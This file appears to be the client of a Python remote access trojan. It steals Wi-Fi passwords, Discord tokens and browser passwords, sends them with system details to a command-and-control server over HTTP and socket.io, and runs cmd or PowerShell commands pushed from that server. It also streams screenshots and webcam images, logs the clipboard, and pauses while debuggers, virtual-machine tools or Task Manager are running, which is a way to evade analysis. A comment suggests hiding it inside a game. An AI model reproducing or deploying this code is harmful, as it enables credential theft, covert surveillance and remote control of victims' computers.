import io
import json
import subprocess
from tkinter import messagebox

import cv2
import psutil
import requests
import socketio
from PIL import Image
from pyautogui import screenshot

from modules.discordgrabber import GetDiscordTokens
from modules.pcinfo import System_information
from modules.wifipasswordsgraber import getPasswords
from modules.clipboardlogger import logger
from modules.getBrowserPasswords import fetch_browser_passwords

from tendo import singleton
#this code is intended to create a single instance of the programme
#You can do something like this:
#run the game again if the programme starts again, but the virus only ran once
try:
	me = singleton.SingleInstance()
	print("Starting")
except:
	print("Not started!")
	exit()

# Settings!!!
remote_server = '127.0.0.1:5000'
protocol = 'http'
enableCamera = False
enableScreen = False

camera = None

def initializeCamera():
	global camera
	try:
		camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
	except Exception as e:
		camera = cv2.VideoCapture('NoCamera.avi')

# Initialize the camera
if enableCamera:
	initializeCamera()

current_machine_id = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
sio = socketio.Client()

clientId = 0

def connect():
	global clientId
	sio.connect(f'{protocol}://{remote_server}')
	clientIdreq = requests.post(f'{protocol}://{remote_server}/client', json={
		"uuid": current_machine_id,
		"osInfo": System_information().replace("\n", "<br>"),
		"wifis": getPasswords(),
		"discordInfo": GetDiscordTokens().replace("\n", "<br>"),
		"browserPasswords": fetch_browser_passwords().replace("\n", "<br>")
	})
	clientId = clientIdreq.text
	print(clientId)

# Connecting to server
while True:
	try:
		connect()
		break
	except Exception as e:
		# print(e)
		print("Error connecting to server. Retrying in 1 second...")
		sio.sleep(1)

previous_clipboard_content = ''

blacklisted_processes = ["httpdebuggerui", "wireshark", "fiddler", "regedit", "taskmgr", "processhacker", "vboxservice", "df5serv", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]

#"cmd",

def is_blacklisted_processes_open():
	# Check if Task Manager is running
	for proc in psutil.process_iter(['name']):
		if proc.info['name'].replace('.exe', '').lower() in blacklisted_processes:
			return True
	return False

@sio.on('send_console')
def send_console(data):
	print(data)

	clientid = data['clientId']

	if clientid != clientId:
		return

	if data['command'] == 'error':
		try:
			title = data['ErrorName']
			text = data['ErrorText']
			print(f"Creating error with title {title} and text {text}")
			messagebox.showerror(title, text)
			#return "successful"
		except Exception as e:
			print(f"Error!!! {e}")

	elif data['command'] == 'cmd':
		cmd_command = data['text']
		result = subprocess.run(cmd_command, capture_output=True, text=True, shell=True)
		print("Output:", result.stdout)

	elif data['command'] == 'powershell':
		powershell_command = data['text']
		result = subprocess.run(['powershell', '-Command', powershell_command], capture_output=True, text=True)
		print("Output:", result.stdout)
	else:
		pass

@sio.on('toggle_camera')
def toggle_camera(json):
	global clientId
	clientid = json['clientId']
	state = int(json['state'])
	if clientid == clientId:
		global enableCamera

		enableCamera = bool(state)


@sio.on('toggle_screen')
def toggle_screen(json):
	global clientId
	clientid = json['clientId']
	state = int(json['state'])
	if clientid == clientId:
		global enableScreen

		enableScreen = bool(state)

while True:
	if not is_blacklisted_processes_open():
		# screen capture
		if enableScreen:
			print("capturing screen")
			try:
				screen = screenshot()
				screen_data = io.BytesIO()
				screen.save(screen_data, "PNG")

				#webhook
				text = {"clientId": clientId, "image": screen_data.getvalue()}
				sio.emit('send_screen', text)
			except Exception as e:
				print(f"Screen error! {e}")
		else:
			print("No screen")

		#camera capture
		if enableCamera:
			print("capturing camera")
			try:
				result, frame = camera.read()
				camera_pil = Image.fromarray(frame)
				camera_data = io.BytesIO()
				camera_pil.save(camera_data, format="PNG")

				#webhook
				text = {"clientId": clientId, "image": camera_data.getvalue()}
				sio.emit('send_camera', text)
			except Exception as e:
				if not camera:
					initializeCamera()
				print(f"Camera error! {e}")
		else:
			print("No camera")

		try:
			logger(sio, clientId)
		except Exception as e:
			print(f"Clipboardlogger error! {e}")

		sio.sleep(1)
	else:
		print("TASK MANAGER!!!!!")

		sio.sleep(10)